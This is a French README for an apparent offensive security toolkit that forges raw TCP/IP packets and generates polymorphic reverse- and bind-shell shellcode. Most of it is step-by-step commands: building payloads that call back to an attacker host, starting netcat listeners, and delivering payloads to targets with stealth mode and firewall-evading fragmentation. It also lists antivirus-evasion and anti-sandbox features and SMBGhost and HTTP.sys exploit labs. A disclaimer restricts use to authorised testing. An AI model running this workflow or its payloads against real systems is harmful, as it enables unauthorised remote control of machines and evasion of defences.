# Packet Forger Suite

## 🎯 Vue d'Ensemble

**Packet Forger Suite** est une collection modulaire d'outils pour la forge de paquets TCP/IP et la génération de payloads, organisée selon le principe de **séparation claire des responsabilités**.

## 🧭 Principe Directeur

**Un seul cœur stable, plusieurs projets satellites spécialisés.**

- Le projet principal est **agnostique du payload**
- Les projets annexes sont **plug-in / consommateurs du cœur**
- Le lien entre eux est une **interface claire**, pas du code entremêlé
- **CLI unifié** : Interface unique pour tous les modules (similaire à Metasploit/Impacket)

**Analogie** : kernel Linux vs drivers, libpcap vs Wireshark, Metasploit Framework vs modules

## 🎯 Interface Unifiée (Recommandée)

**`packet-forger`** : CLI unifié pour tous les modules (similaire à Metasploit/Impacket)

### ✨ Fonctionnalités

- **Interface unique** avec sous-commandes
- **Mode verbeux** : `--verbose` ou `-V` pour plus de détails
- **Auto-complétion** : Support Bash et Zsh
- **Messages colorés** : Lisibilité améliorée
- **Détection automatique** des binaires

### 💻 Exemples

```bash
# Générer un payload (mode verbeux avec hexdump et détails)
packet-forger --verbose payload build windows reverse --lhost 192.168.10.20 --lport 4444

# Transporter un payload (mode verbeux avec détails IP/TCP)
sudo ~/.local/bin/packet-forger --verbose core send --payload payload.bin --target 192.168.10.5 --port 80

# Lister les CVEs
packet-forger lab list

# Consulter la documentation
packet-forger research show ASLR
```

### 🔍 Mode Verbose (`--verbose` ou `-V`)

Le mode verbose fournit une visibilité complète sur les opérations :

**Pour la génération de payloads** :
- Paramètres de génération (plateforme, type, listener)
- Étapes de génération détaillées
- Statistiques du payload (magic bytes, bytes null, caractères imprimables)
- **Hexdump complet** du payload généré

**Pour l'envoi de paquets** :
- **Hexdump du payload brut** avant encapsulation
- Détails de l'encapsulation (HTTP/SMB/etc.)
- **Construction IP étape par étape** (version, IHL, TTL, checksum, etc.)
- **Construction TCP étape par étape** (ports, SEQ/ACK, flags, window, checksum)
- **Hexdump complet du paquet final** (IP + TCP + Payload)

👉 Voir [Documentation CLI - Mode Verbose](packet-forger-cli/README.md#mode-verbose) pour plus de détails

👉 [Documentation CLI Unifié](packet-forger-cli/README.md)

## 📦 Modules

### 🟢 packet-forger-core

**TCP/IP bas niveau, RFC-compliant, agnostique du payload**

- Forge de paquets IP/TCP (RFC 791, 793, 1122)
- Handshake TCP manuel et stateful avec validation complète (SEQ/ACK/Window Size)
- Fragmentation IP
- Profils TCP OS-like
- Analyse des erreurs SMB (feedback détaillé)
- **Ne génère PAS de shellcode**
- **Ne connaît PAS les CVE**

👉 [Documentation Core](packet-forger-core/README.md)

### 🔵 packet-forger-payloads

**Génération de shellcode native et polymorphe**

- Shellcode Linux x64 / Windows x64
- **Code assembleur Windows reverse shell complet** (~824 bytes)
- Résolution dynamique d'API Windows (PEB walk, GetProcAddress)
- Polymorphisme anti-signature
- Pipeline NASM-only (génération → assemblage → extraction)
- Documentation anti-sandbox (techniques et limitations)
- **Ne forge PAS de paquets**

👉 [Documentation Payloads](packet-forger-payloads/README.md)

### 🟠 packet-forger-labs

**Laboratoires contrôlés et POC pédagogiques**

- Serveurs vulnérables de test
- CVE documentées (Log4Shell, Struts, etc.)
- Scénarios MITM / RCE
- **Aucun code dans le core**

👉 [Documentation Labs](packet-forger-labs/README.md)

### 🟣 packet-forger-research

**Recherche théorique sur les protections mémoire**

- Documentation ASLR / DEP / Canary
- Templates ROP théoriques
- Études de cas
- **Recherche, pas framework**

👉 [Documentation Research](packet-forger-research/README.md)

## 🔗 Communication Entre Modules

### Interface Unifiée (Recommandée)

Le CLI unifié `packet-forger` simplifie l'utilisation de tous les modules :

```bash
# Workflow complet en deux commandes
packet-forger payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 --output /tmp/payload.bin

sudo packet-forger core send \
    --payload /tmp/payload.bin \
    --target 192.168.10.5 --port 80
```

### Interface Payload (Core ↔ Payloads)

```
payloads  ──▶  core
   │            │
   │            │
   └─ génère    └─ transporte
   payload.bin  (opaque)
```

**Workflow avec CLI unifié** (recommandé) :

```bash
# 1. Générer le payload
packet-forger payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output payload.bin

# 2. Transporter via le core
sudo packet-forger core send \
    --payload payload.bin \
    --target 192.168.10.5 --port 80 \
    --transport-profile windows
```

**Workflow avec interfaces directes** (alternative) :

```bash
# 1. Générer le payload
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output ../payload.bin

# 2. Transporter via le core
cd ../packet-forger-core
sudo ./bin/packet-forger-core --payload ../payload.bin \
    --target 192.168.10.5 --port 80 \
    --transport-profile windows
```

## 📊 Matrice de Responsabilités

| Fonctionnalité | Core | Payloads | Labs | Research |
|----------------|------|----------|------|----------|
| **Forge TCP/IP** | ✅ | ❌ | ❌ | ❌ |
| **Handshake TCP** | ✅ | ❌ | ❌ | ❌ |
| **Génération shellcode** | ❌ | ✅ | ❌ | ❌ |
| **Polymorphisme** | ❌ | ✅ | ❌ | ❌ |
| **CVE applicatives** | ❌ | ❌ | ✅ | ❌ |
| **ROP théorique** | ❌ | ❌ | ❌ | ✅ |

## 🔍 Clarification des Responsabilités

```
packet-forger-core ne génère pas de shellcode
packet-forger-payloads ne forge pas de paquets
Les deux communiquent via une interface de payload binaire
```

**Séparation claire** :
- Le **core** transporte des octets, point. Il ne sait pas ce qu'est un shellcode.
- Les **payloads** génèrent des binaires, point. Ils ne savent pas comment les transporter.
- Les **labs** contiennent des POC pédagogiques, point. Aucun code dans le core.
- La **recherche** documente des techniques théoriques, point. Pas de runtime link avec le core.

## 🚀 Installation

### Installation Complète (Recommandée)

```bash
git clone https://github.com/your-repo/packet-forger-suite.git
cd packet-forger-suite

# Compiler tous les modules
cd packet-forger-core && make
cd ../packet-forger-payloads && make
cd ../packet-forger-cli && make

# Installer le CLI unifié (recommandé)
cd ../packet-forger-cli && sudo make install
```

### Installation Modulaire

Vous pouvez installer uniquement les modules dont vous avez besoin :

```bash
# Core uniquement
cd packet-forger-core && make && sudo make install

# Payloads uniquement
cd packet-forger-payloads && make && sudo make install

# CLI unifié uniquement (nécessite que les autres modules soient compilés)
cd packet-forger-cli && make && sudo make install
```

### Interface Unifiée (Recommandée)

Le CLI unifié `packet-forger` permet d'utiliser tous les modules via une seule interface :

```bash
# Aide principale
packet-forger --help

# Générer un payload
packet-forger payload build windows reverse --lhost 192.168.10.20 --lport 4444

# Transporter un payload
packet-forger core send --payload payload.bin --target 192.168.10.5 --port 80

# Lister les CVEs
packet-forger lab list

# Consulter la documentation
packet-forger research show ASLR
```

## 💻 Exemples d'Utilisation

### 🎯 Interface Unifiée (Recommandée)

Le CLI unifié `packet-forger` permet d'utiliser tous les modules via une seule interface, similaire à Metasploit ou Impacket :

#### Exemple 1 : Workflow complet (génération + transport)

```bash
# 1. Générer un payload Windows polymorphe
packet-forger payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output /tmp/payload.bin

# 2. Mettre en écoute (dans un autre terminal)
nc -lvp 4444

# 3. Transporter le payload via TCP/IP
sudo packet-forger core send \
    --payload /tmp/payload.bin \
    --target 192.168.10.5 \
    --port 80 \
    --transport-profile windows
```

#### Exemple 2 : Utilisation des labs

```bash
# Lister les CVEs disponibles
packet-forger lab list

# Consulter la documentation d'un CVE
packet-forger lab show CVE-2015-1635

# Démarrer un serveur vulnérable
packet-forger lab server http

# Tester un CVE
packet-forger lab test CVE-2015-1635
```

#### Exemple 3 : Documentation recherche

```bash
# Lister les sujets disponibles
packet-forger research list

# Consulter la documentation ASLR
packet-forger research show ASLR

# Consulter les templates ROP
packet-forger research show ROP
```

### 🟢 packet-forger-core (Interface directe)

#### Exemple 1 : Transport basique d'un payload

```bash
# Transporter un payload binaire via TCP/IP
sudo ./bin/packet-forger-core \
    --payload payload.bin \
    --target 192.168.10.5 \
    --port 80
```

#### Exemple 2 : Transport avec profil Windows et mode stealth

```bash
# Utiliser un profil TCP Windows-like avec mode stealth
sudo ./bin/packet-forger-core \
    --payload payload.bin \
    --target 192.168.10.5 \
    --port 445 \
    --transport-profile windows \
    --stealth
```

#### Exemple 3 : Transport avec fragmentation IP

```bash
# Fragmenter le paquet pour contourner les pare-feu
sudo ./bin/packet-forger-core \
    --payload payload.bin \
    --target 192.168.10.5 \
    --port 80 \
    --fragment
```

#### Exemple 4 : Tests unitaires réseau

```bash
# Exécuter tous les tests (23 tests)
cd packet-forger-core
make test

# Tests individuels
./bin/test-handshake        # Tests handshake TCP (10 tests)
./bin/test-fragmentation    # Tests fragmentation IP (5 tests)
./bin/test-rfc-compliance   # Tests conformité RFC (8 tests)
```

### 🔵 packet-forger-payloads

#### Exemple 1 : Génération d'un reverse shell Windows

```bash
# Reverse shell Windows avec résolution dynamique d'API
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 \
    --lport 4444 \
    --output payload.bin

# Résultat : payload.bin (~824 bytes) + payload.bin.json
```

#### Exemple 2 : Reverse shell Linux polymorphe

```bash
# Génération polymorphe (chaque exécution produit un shellcode différent)
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 \
    --lport 4444 \
    --polymorphic \
    --output payload.bin
```

#### Exemple 3 : Bind shell Linux avec encodage XOR

```bash
# Bind shell sur port 4444 avec encodage XOR
./bin/payload-builder build linux bind \
    --lport 4444 \
    --encode-xor \
    --output payload.bin
```

#### Exemple 4 : Workflow complet (Payload → Core)

```bash
# 1. Générer le payload Windows polymorphe
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 \
    --lport 4444 \
    --polymorphic \
    --output ../payload.bin

# 2. Mettre en écoute un listener (dans un autre terminal)
nc -lvp 4444

# 3. Transporter le payload via le core
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../payload.bin \
    --target 192.168.10.5 \
    --port 80 \
    --transport-profile windows
```

### 🟠 packet-forger-labs

#### Exemple 1 : Démarrer les serveurs vulnérables

```bash
# Démarrer tous les serveurs vulnérables
cd packet-forger-labs
./scripts/run_vulnerable_servers.sh

# Ou démarrer individuellement
python3 servers/vulnerable_http_server.py &
python3 servers/vulnerable_smb_server.py &
```

#### Exemple 2 : Tester CVE-2015-1635 (HTTP.sys DoS)

```bash
# Tester l'exploit HTTP Range DoS
cd packet-forger-labs
./scripts/test_cve_2015_1635.sh

# Ou manuellement
cd cve
make CVE-2015-1635-http-dos.o
# Utiliser le code compilé selon la documentation
```

#### Exemple 3 : Tester CVE-2020-0796 (SMBGhost)

```bash
# Tester l'exploit SMBv3 Compression Buffer Overflow
cd packet-forger-labs
./scripts/test_cve_2020_0796.sh

# Voir la documentation
cat docs/CVE-2020-0796.md
```

#### Exemple 4 : Scénario pédagogique complet

```bash
# 1. Démarrer le serveur vulnérable
cd packet-forger-labs
python3 servers/vulnerable_http_server.py &

# 2. Générer un payload
cd ../packet-forger-payloads
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output ../payload.bin

# 3. Mettre en écoute
nc -lvp 4444 &

# 4. Transporter via le core
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../payload.bin \
    --target 127.0.0.1 \
    --port 8080
```

### 🟣 packet-forger-research

#### Exemple 1 : Consulter la documentation mémoire

```bash
# Documentation sur ASLR
cat packet-forger-research/memory/ASLR.md

# Documentation sur DEP/NX
cat packet-forger-research/memory/DEP_NX.md

# Documentation sur Stack Canary
cat packet-forger-research/memory/STACK_CANARY.md
```

#### Exemple 2 : Étudier les templates ROP

```bash
# Templates ROP théoriques
cat packet-forger-research/rop/TEMPLATES.md

# Corrélation réseau ↔ mémoire
cat packet-forger-research/network/MEMORY_CORRELATION.md
```

#### Exemple 3 : Études de cas

```bash
# Étude de cas théorique
cat packet-forger-research/case_studies/CASE_STUDY_1.md
```

## 📚 Documentation

- **[ARCHITECTURE.md](docs/ARCHITECTURE.md)** : Architecture détaillée et séparation des responsabilités
- **[ROADMAP.md](ROADMAP.md)** : Feuille de route complète avec phases de migration
- **[packet-forger-cli/README.md](packet-forger-cli/README.md)** : Documentation du CLI unifié (recommandé)
- **[packet-forger-core/README.md](packet-forger-core/README.md)** : Documentation du core
- **[packet-forger-payloads/README.md](packet-forger-payloads/README.md)** : Documentation des payloads
- **[packet-forger-labs/README.md](packet-forger-labs/README.md)** : Documentation des labs
- **[packet-forger-research/README.md](packet-forger-research/README.md)** : Documentation de la recherche

## 🗺️ Feuille de Route

Voir [ROADMAP.md](ROADMAP.md) pour la feuille de route complète.

### ✅ Phase 1 — Stabilisation du Core (TERMINÉE)
- ✅ Nettoyage du core (suppression CVE, RCE applicatives)
- ✅ Interface payload opaque fonctionnelle
- ✅ Tests unitaires réseau (23 tests : handshake, fragmentation, conformité RFC)

### ✅ Phase 2 — Extraction du Shellcode (TERMINÉE)
- ✅ Migration du code shellcode vers `packet-forger-payloads`
- ✅ Format de sortie stable (.bin + .json)
- ✅ CLI indépendante complète
- ✅ **Code assembleur Windows reverse shell fonctionnel** (~824 bytes)

### ✅ Phase 3 — Démonstrations Contrôlées (TERMINÉE)
- ✅ Serveurs vulnérables (HTTP, SMB)
- ✅ Scénarios documentés (SCENARIOS.md)
- ✅ CVE en POC (CVE-2015-1635, CVE-2020-0796)

### ✅ Phase 4 — Recherche Avancée (TERMINÉE)
- ✅ Documentation mémoire (ASLR, DEP/NX, Stack Canary)
- ✅ Templates ROP théoriques
- ✅ Études de cas pédagogiques

### ✅ Refactorisation & Amélioration Ciblée (TERMINÉE)
- ✅ **Handshake TCP (Niveau Pro)** : Validation SEQ/ACK/Window Size (RFC 793/1122)
- ✅ **Encapsulation SMB - Analyse des Erreurs** : Fonction `analyze_smb_response()` avec feedback détaillé
- ✅ **Shellcode Polymorphe → Anti-Sandbox** : Documentation complète (ANTI_SANDBOX.md)

## 📚 Documentation Complémentaire

- **[ARCHITECTURE.md](docs/ARCHITECTURE.md)** : Architecture détaillée du projet
- **[INTEGRATION.md](docs/INTEGRATION.md)** : Guide d'intégration entre modules
- **[ROADMAP.md](ROADMAP.md)** : Feuille de route et historique de développement
- **[STATUS.md](STATUS.md)** : État actuel du projet

### Documentation par Module

- **Core** : [packet-forger-core/README.md](packet-forger-core/README.md)
- **Payloads** : [packet-forger-payloads/README.md](packet-forger-payloads/README.md)
- **Labs** : [packet-forger-labs/README.md](packet-forger-labs/README.md)
- **Research** : [packet-forger-research/README.md](packet-forger-research/README.md)
- **CLI** : [packet-forger-cli/README.md](packet-forger-cli/README.md)

## 📁 Structure du Projet

```
packet-forger-suite/
├── docs/                    # Documentation partagée
│   ├── ARCHITECTURE.md      # Architecture détaillée
│   ├── INTEGRATION.md       # Guide d'intégration
│   └── archive/             # Documentation historique
├── packet-forger-core/      # Module TCP/IP bas niveau
│   ├── src/                 # Code source
│   ├── include/             # Headers
│   ├── tests/               # Tests unitaires
│   └── bin/                 # Binaires compilés (gitignored)
├── packet-forger-payloads/  # Module génération shellcode
│   ├── src/                 # Code source
│   ├── include/             # Headers
│   ├── cli/                 # CLI indépendante
│   ├── docs/                # Documentation spécifique
│   └── output/              # Payloads générés (gitignored)
├── packet-forger-labs/      # Module CVEs pédagogiques
│   ├── cve/                 # Implémentations CVE
│   ├── servers/             # Serveurs vulnérables
│   ├── scripts/             # Scripts de test
│   └── captures/            # Captures réseau (gitignored)
├── packet-forger-research/  # Module recherche théorique
│   ├── memory/              # Documentation mémoire
│   ├── rop/                 # Templates ROP
│   └── network/             # Corrélation réseau/mémoire
└── packet-forger-cli/       # CLI unifié
    ├── src/                 # Code source
    ├── completions/         # Scripts auto-complétion
    └── bin/                 # Binaire (gitignored)
```

## ⚠️ Avertissement

Cet outil est destiné **UNIQUEMENT** à des fins :
- **Éducatives** : Apprentissage des techniques de sécurité réseau
- **De test** : Tests de pénétration autorisés
- **De recherche** : Recherche en sécurité

**L'utilisation de cet outil sur des systèmes sans autorisation explicite est ILLÉGALE et peut entraîner des poursuites judiciaires.**

## 🤝 Contribution

Les contributions sont les bienvenues ! Voir [CONTRIBUTING.md](CONTRIBUTING.md) pour plus de détails.

## 📝 Licence

Ce projet est fourni à des fins éducatives. Voir le fichier LICENSE pour plus de détails.

---

**Version** : 3.0 (Architecture Modulaire)  
**Dernière mise à jour** : 2024-12-16  
**Statut** : ✅ Toutes les phases de migration terminées + Refactorisation & Amélioration Ciblée complétée

